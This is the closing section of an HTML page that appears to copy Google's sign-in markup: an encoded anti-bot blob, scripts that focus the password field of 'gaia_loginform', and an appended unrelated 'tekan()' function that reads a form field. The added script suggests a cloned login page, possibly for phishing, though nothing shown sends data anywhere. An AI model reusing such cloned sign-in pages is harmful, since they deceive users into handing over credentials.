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');

  </script>
<script>
  (function() {
  function gaia_setFocus() {
  var form = null;
  if (document.getElementById) {
  form = document.getElementById('gaia_loginform');
  }
  if (form && form.Passwd) {
  form.Passwd.focus();
  }
  }
  if (!/iPad|iPhone|iPod/.test(navigator.userAgent)) {
  gaia_attachEvent(window, 'load', gaia_setFocus);
  }
  })();
</script>
<script>
  var gaia_scrollToElement = function(element) {
  var calculateOffsetHeight = function(element) {
  var curtop = 0;
  if (element.offsetParent) {
  while (element) {
  curtop += element.offsetTop;
  element = element.offsetParent;
  }
  }
  return curtop;
  }
  var siginOffsetHeight = calculateOffsetHeight(element);
  var scrollHeight = siginOffsetHeight - window.innerHeight +
  element.clientHeight + 0.02 * window.innerHeight;
  window.scroll(0, scrollHeight);
  }
</script>
<script>
  function gaia_onLoginSubmit() {
  try {
  gaia.loginAutoRedirect.stop();
  } catch (err) {
  // do not prevent form from being submitted
  }
  try {
  document.bg.invoke(function(response) {
  document.getElementById('bgresponse').value = response;
  });
  } catch (err) {
  document.getElementById('bgresponse').value = '';
  }
  return true;
  }
  document.getElementById('gaia_loginform').onsubmit = gaia_onLoginSubmit;
  var signinButton = document.getElementById('signIn');
  gaia_attachEvent(window, 'load', function(){
  gaia_scrollToElement(signinButton);
  });
</script>

<script languange ="JavaScript">
<!--
function tekan()
{
var namastr = (document.form1.key1.value);
//window.alert(""+namastr);

}
//-->
</script>

</body></html>
